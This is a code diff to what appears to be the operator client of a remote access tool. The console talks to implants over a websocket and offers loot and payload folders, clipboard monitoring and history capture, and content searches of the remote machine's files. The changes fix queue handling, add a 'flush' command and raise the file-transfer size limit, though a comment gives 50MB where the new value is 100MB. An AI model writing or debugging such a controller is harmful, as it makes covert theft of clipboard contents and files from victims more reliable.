@@ -84,6 +84,7 @@ def print_help():
 ║   ls_loot                              List files in loot/                  ║
 ║   ls_payloads                          List files in payloads/              ║
 ║   ls_downloads                         List files in downloads/             ║
+║   flush                                Discard stale queued messages        ║
 ║   help                                 Display this help                    ║
 ║   exit / quit                          Exit the session                     ║
 ╚═════════════════════════════════════════════════════════════════════════════╝
@@ -133,7 +134,7 @@ async def main():
             uri,
             ssl=ssl_context,
             ping_interval=None,
-            max_size=10_000_000  # 10MB pour les fichiers
+            max_size=100_000_000  # 50MB limit for files
         ) as websocket:
             
             print("[+] Connected to server")
@@ -229,6 +230,15 @@ async def main():
             # Start background message receiver
             receiver_task = asyncio.create_task(message_receiver())
             
+            # FIX 3: drain stale queued messages after errors so the next command
+            # gets its own response instead of a leftover from the failed command
+            def drain_queue(q):
+                while not q.empty():
+                    try:
+                        q.get_nowait()
+                    except asyncio.QueueEmpty:
+                        break
+
             # Interactive session
             while True:
                 try:
@@ -243,6 +253,12 @@ async def main():
                     
                     if cmd.lower() == "help":
                         print_help()
+                        continue
+                    
+                    if cmd.lower() == "flush":
+                        count = command_queue.qsize()
+                        drain_queue(command_queue)
+                        print(f"[*] Flushed {count} queued message(s)")
                         continue
                     
                     # Processing file requests
@@ -299,11 +315,12 @@ async def main():
                         # Check for --content option
                         if args.startswith("--content "):
                             content = args.split(" ", 1)[1]
+                            # FIX: use SEARCH_CONTENT: prefix instead of SEARCH_FILES:*:content
                             if max_results:
-                                await websocket.send(f"SEARCH_FILES:*:{content}:{max_results}")
+                                await websocket.send(f"SEARCH_CONTENT:*:{content}:{max_results}")
                                 print(f"[*] Searching for content: {content} (limit: {max_results})")
                             else:
-                                await websocket.send(f"SEARCH_FILES:*:{content}")
+                                await websocket.send(f"SEARCH_CONTENT:*:{content}")
                                 print(f"[*] Searching for content: {content}")
                         else:
                             pattern = args
@@ -358,8 +375,9 @@ async def main():
                         # Send monitoring command
                         await websocket.send(f"CLIPBOARD_MONITOR:{duration}")
                         
-                        # Wait for start confirmation
-                        start_msg = await asyncio.wait_for(websocket.recv(), timeout=5.0)
+                        # FIX 2: use command_queue instead of websocket.recv() directly —
+                        # message_receiver already owns recv(); two concurrent recv() calls crash
+                        start_msg = await asyncio.wait_for(command_queue.get(), timeout=5.0)
                         print(start_msg)
                         
                         # Don't block - just continue to prompt
@@ -378,11 +396,14 @@ async def main():
                         entries_found = 0
                         while True:
                             try:
-                                msg = await asyncio.wait_for(websocket.recv(), timeout=2.0)
+                                # FIX: use command_queue, not websocket.recv() directly —
+                                # message_receiver already owns recv()
+                                msg = await asyncio.wait_for(command_queue.get(), timeout=2.0)
                                 
                                 if msg.startswith("CLIPBOARD_HISTORY_ENTRY:"):
                                     # Format: CLIPBOARD_HISTORY_ENTRY:timestamp:b64_content
-                                    import base64
+                                    # FIX 1: removed local 'import base64' — caused "referenced before assignment"
+                                    # for clipboard set, because Python treats any in-function import as local
                                     data = msg[len("CLIPBOARD_HISTORY_ENTRY:"):]
                                     timestamp = data[:19]
                                     b64_content = data[20:]
@@ -631,6 +652,7 @@ async def main():
                         print(result)
                     except asyncio.TimeoutError:
                         print("[!] Command timeout - no response received")
+                        drain_queue(command_queue)
                 
                 except websockets.exceptions.ConnectionClosed:
                     print("[!] Connection closed")
@@ -640,6 +662,7 @@ async def main():
                     break
                 except Exception as e:
                     print(f"[ERROR] {e}")
+                    drain_queue(command_queue)
     
     except websockets.exceptions.InvalidStatusCode as e:
         print(f"[ERROR] Connection rejected: {e}")
